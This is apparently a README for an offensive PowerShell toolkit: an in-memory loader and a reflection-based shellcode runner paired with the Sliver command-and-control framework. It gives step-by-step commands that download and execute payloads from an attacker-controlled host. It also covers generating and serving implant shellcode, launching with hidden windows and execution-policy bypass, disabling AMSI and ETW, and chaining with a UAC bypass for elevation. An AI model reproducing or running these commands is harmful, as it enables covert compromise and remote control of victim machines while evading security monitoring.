# Reflective PowerShell Loader

## Files

| File | Purpose |
|---|---|
| `ps-loader.ps1` | Downloads a PowerShell payload over HTTP and executes it entirely in memory |
| `ps-shellcode-runner.ps1` | Reflection-based shellcode runner — resolves WinAPI via `LookupFunc`, allocates and executes shellcode in memory |

## Usage

**1. Update the payload URL in `ps-loader.ps1`:**
```powershell
$PayloadUrl = "http://<IP>/payload.ps1"
```

**2. Host your payload on your HTTP server:**
```bash
python3 -m http.server 80
```

**3. Start your listener:**
```bash
sliver > mtls --lhost <IP> --lport 443
```

**4. Deliver and execute on the target** from a PowerShell session:
```powershell
# Download and run the loader itself in memory
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/ps-loader.ps1')
```

Or transfer and run directly:
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-loader.ps1
```

---

## Reflection Shellcode Runner (`ps-shellcode-runner.ps1`)

Executes raw shellcode in memory using only PowerShell reflection — no `Add-Type`, no P/Invoke declarations, no imported modules. Resolves `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` entirely at runtime via `LookupFunc`.

A full Sliver implant is multi-MB, so download it at runtime instead of pasting it inline:

**1. Generate the shellcode and host it:**
```bash
sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
python3 -m http.server 80        # serve /tmp/sc.bin from this directory
```

**2. Point `$buf` at it in `ps-shellcode-runner.ps1`:**
```powershell
[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://<IP>/sc.bin')
```

For small shellcode (a stager), paste the bytes inline instead — see `sliver/README.md` §4 (staged payloads).

**3. Start your listener:**
```bash
sliver > mtls --lhost <IP> --lport 443
```

**4. Run on the target:**
```powershell
# Transfer and execute
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-shellcode-runner.ps1

# Or load directly into memory from your server
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/ps-shellcode-runner.ps1')
```

> Pair with `ps-loader.ps1` to have the loader download and IEX the shellcode runner — AMSI and ETW are killed before the shellcode bytes ever get scanned.

----

## Chaining with UAC Bypass

If you need elevated execution, chain with `uac-bypass.ps1` — set the payload in the UAC bypass to download and run this loader:

```powershell
# In uac-bypass.ps1:
$payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c " +
           "`"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/ps-loader.ps1')`""
```
